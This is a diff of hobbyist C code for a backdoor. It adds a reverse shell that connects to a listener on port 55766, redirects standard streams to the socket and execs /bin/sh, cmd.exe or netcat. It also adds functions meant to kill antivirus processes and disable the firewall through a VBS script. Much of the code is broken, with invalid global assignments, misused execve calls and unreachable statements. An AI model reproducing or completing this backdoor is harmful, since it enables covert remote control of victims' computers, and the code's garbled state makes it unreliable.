@@ -1,100 +1,156 @@
-/* reverse shell.c  
-a skelleton of reverse shell contained in the backdoor. */
-
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <string.h>
 #include <errno.h>
+#include <string.h>
 #include <arpa/inet.h>
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 
-#define IP "127.0.0.1"
+#define remote_addr "127.0.0.1"
+#define remote_port 55766
 
-#define PORT 55766
+/* struct of cong=figurations to target. */
 
-  typedef struct target {
+  typedef struct client {
 
-  char * ip;
+  char REMOTE_ADDR;
+  int REMOTE_PORT;
+ /* char cmd[_T_SIZE 256];
+  char send[2046]; */
 
-  int port;
+  } Client;
 
-  char cmd[1025]; /* commands receivd from the server */
+  typedef struct connection_success {
+/*
+  int sockfd;
+  int newsockfd;
+  int listenfd; */
 
-  int listenfd;
+  int x;
 
-  //socklen_t clien;
+  } Connection_success;
 
-  int n;
-  /* int persistency;  run a thread function to keep connection aliv */
+  x = 1;
 
-  } Target;
+  //function  to disable antivirus. /
 
-  int main() {
+void kill_antivirus()
 
-  Target target;
-    
-  /* set up the functins */
-    
-  struct sockaddr_in serv_addr;
+  {
+     //int i;
+     FILE *arq;
 
-  const unsigned int sockfd;
-  const unsigned int newsockfd;
-  const char cmd;
-  const unsigned int listenfd;
- 
-  int socklen_t clien; 
+    arq = fopen("av.txt", "rb");
+    if(arq == 0)
+        exit(EXIT_SUCCESS);
+    else
+   //     while( (arq=fgetc(arq)) != EOF)
+     //     if (arq = '\n')
 
-  const unsigned int n;
-  
-  /* create connection */  
-    
-  sockfd = socket(AF_INET, SOCK_STREAM, 0);
-  if (sockfd < 0)
-      perror("error 101");
-  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+   execve("TASKLIST /FI 'STATUS eq RUNNING'", 0, 0);
+//   send(msocket,"Killing anti virus...\n",31,0);
+   execve("TASKKILL /F /IM \{}\ '>> NUL'", 0, 0);
+
+   return;
+
+}
+
+/* in this, i use a .vbs file, and invoked from execv(); */
+
+void kill_firewall()
+
+  {
+
+   execve("firewall.vbs",0,0);
+
+   exit (EXIT_SUCCESS);
+
+  }
+
+  /* create connection */
+  void shell()
+
+  {
+    //int x;
+    struct sockaddr_in s;
+
+    s.sin_family = AF_INET;
+    s.sin_addr.s_addr = inet_addr(remote_addr);
+    s.sin_port = htons(remote_port);
+
+    x = socket(AF_INET, SOCK_STREAM, 0);
+
+    connect(x, (struct sockaddr *)&s, sizeof(s));
+
+    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR) failed");
 
+    send(x,"\nConnected\n",12,0);
+
+    dup2(x, 0);
+    dup2(x, 1);
+    dup2(x, 2);
+
+    execve("/bin/sh", 0, 0);
+    execve("cmd.exe", 0, 0);
+    execve("/netcat", 0, 0);
+
+ }
+   /* execute the program */
+
+   int main(int argc, char *argv[])
+
+   {
+
+    while(1)
+
+    shell();
+
+    kill_antivirus();
+    kill_firewall();
+
+
+    }
+
+
+
+
+  /* static const unsigned char **ip;
+   static const unsigned long int *port;
+   static const unsigned char *cmd;
+
+   static const long unsigned int *newsockfd;
+   static const long unsigned int *n;
+   static const long unsigned int *listenfd;
+   static const long unsigned int *clien;
+
+  listenfd = socket(AF_INET, SOCK_STREAM, 0);
+
   memset(&serv_addr, '0', sizeof(serv_addr));
-  memset(cmd, '0' , sizeof(cmd));
+  memset(&cmd, '0', sizeof(cmd));
 
   serv_addr.sin_family = AF_INET;
-  serv_addr.sin_addr.s_addr = htonl(IP);
-  serv_addr.sin_port = htons(PORT);
+  serv_addr.sin_addr.s_addr = htonl(ip);
+  serv_addr.sin_port = htons(port);
+
+  if (listenfd < 0)
+      perror("error 101");
+
+  if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+    perror("setsockopt(SO_REUSEADDR) failed");
 
   bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
 
   listen(listenfd, 10);
 
-  // printf("about to listen\n");
-     listen(sockfd,5);
+  printf("about to listen\n");
+     listen(listenfd, 10);
      clien = sizeof(serv_addr);
-    // printf("About to accept\n");
 
-     int i;
+     printf("About to accept\n");
 
-     for(i=0; i<100; i++){
-         newsockfd = accept(sockfd,
-                 (struct sockaddr *) &serv_addr,
-                 &clien);
-
-         if (newsockfd < 0)
-             error("ERROR on accept");
-         bzero(cmd,256);
-         n = read(newsockfd,cmd,255);
-         if (n < 0) error("ERROR reading from socket");
-         printf("Package > %s\n",cmd);
-         n = write(newsockfd,"RESPONSE=OK",18);
-         if (n < 0) error("ERROR writing to socket");
-         close(newsockfd);
      }
-     close(sockfd);
-     return 0;
-}
-/* sockfd = socket(AF_INET, SOCK_STREAM, 0);
-if (sockfd < 0)
-    error("ERROR opening socket");
-
-if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
-    error("setsockopt(SO_REUSEADDR) failed"); */
+*/
